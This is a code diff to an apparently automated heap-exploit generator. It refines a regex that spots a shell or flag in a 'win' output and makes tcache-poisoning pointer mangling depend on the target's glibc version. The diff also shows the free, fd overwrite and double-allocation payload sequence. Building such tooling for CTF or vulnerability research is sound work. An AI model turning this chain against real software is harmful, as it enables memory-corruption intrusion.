@@ -28,9 +28,14 @@ from ...jobs.registry import register_stage
 CHAIN_STAGE = "chain_primitive"
 TOOL_VERSION = "chain-1"
 _NL = b"\n"
-# What a win's output looks like -- a flag banner (NAME{...}), the word flag, or a shell prompt --
-# so the PIE leak-chain confirms on the win actually RUNNING, not on incidental run-to-run noise.
-_WIN_OUT = re.compile(rb"[A-Za-z_][A-Za-z0-9_]{1,15}\{[^}\n]{2,}\}|flag|/bin/sh|\$ |^# ", re.I)
+# What a win's output looks like -- a flag banner (NAME{...}), a literal /bin/sh, or a shell prompt
+# at the start of a line -- so the PIE leak-chain confirms on the win actually RUNNING, not on
+# incidental run-to-run noise. The bare case-insensitive `flag` and `$ ` tokens were dropped: they
+# match far too much (any line containing "flag"/"flagged", any "$ " amount) and, while the positive
+# vs negative-control differencing (pos_lines - neg_lines) usually cancels them, they are the one
+# false-positive lever left when win and control output differ incidentally. The brace-banner shape
+# already covers a real `flag{...}`; `^[#$] ` (multiline) is an actual shell prompt, not a token.
+_WIN_OUT = re.compile(rb"[A-Za-z_][A-Za-z0-9_]{1,15}\{[^}\n]{2,}\}|/bin/sh|^[#$] ", re.I | re.M)
 # CWE -> the aaheg vuln class the discovered primitive represents.
 _VCLASS = {"CWE-415": "double_free", "CWE-416": "uaf", "CWE-122": "heap_overflow",
            "CWE-129": "oob_write"}
@@ -187,7 +192,7 @@ def chain_primitive_stage(ctx) -> dict:
                                     writer=edit_o, off=None, trig=show_o, exe=exe)
                 # tcache-poison: free -> UAF-overwrite fd -> alloc a chunk over a code ptr
                 tc = _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts,
-                                   model, width, workdir, capture)
+                                   model, width, workdir, capture, glibc=_glibc)
                 if tc:
                     seq, tgt, trig = tc
                     return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
@@ -539,7 +544,7 @@ def _trace_first_alloc(ctx, exe, alloc_info, drive: bytes, width, workdir) -> in
 
 
 def _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts, model, width,
-                  workdir, capture):
+                  workdir, capture, glibc=None):
     """Drive a live tcache-poisoning chain: free a chunk, overwrite its fd (via the UAF/double-free)
     with a mangled pointer to a code-pointer target, allocate twice to obtain a chunk AT the target,
     write the win address there, and trigger. Confirms control reached the win under the debugger,
@@ -548,6 +553,12 @@ def _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts, m
     from ..dynamic import heap_discover, heaptrace
     from ..fuzz import menu
     from . import exploit
+    # Safe-linking (the tcache fd mangle `(addr>>12)^fd`) landed in glibc 2.32. Mangling on a
+    # PRE-2.32 target produces a wrong fd and the poison silently never confirms -- the bug the
+    # audit found (the computed glibc version was dropped before this chain). Mangle only when the
+    # target's glibc is >= 2.32, or when the version is unknown (modern default, fail toward the
+    # common case). `glibc` is (major, minor) from rop.libc_version, or None.
+    safe_linking = glibc is None or (isinstance(glibc, tuple) and tuple(glibc) >= (2, 32))
     alloc_info = heaptrace.identify_allocator(functions, edges) or heap_discover._libc_plt_pair(exe)
     if not alloc_info:
         return None
@@ -584,7 +595,7 @@ def _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts, m
             for tgt in targets:
                 if ctx.should_cancel():
                     return None
-                mangled = (a >> 12) ^ tgt                 # glibc >= 2.32 safe-linking
+                mangled = ((a >> 12) ^ tgt) if safe_linking else tgt   # safe-linking: glibc >= 2.32
                 poison = (_op(alloc_opt, size) + _idx_op(free_opt, 0) + _edit(0, _p64(mangled), pad)
                           + _op(alloc_opt, size) + _op(alloc_opt, size)
                           + _edit(2, _p64(win_addr), pad))
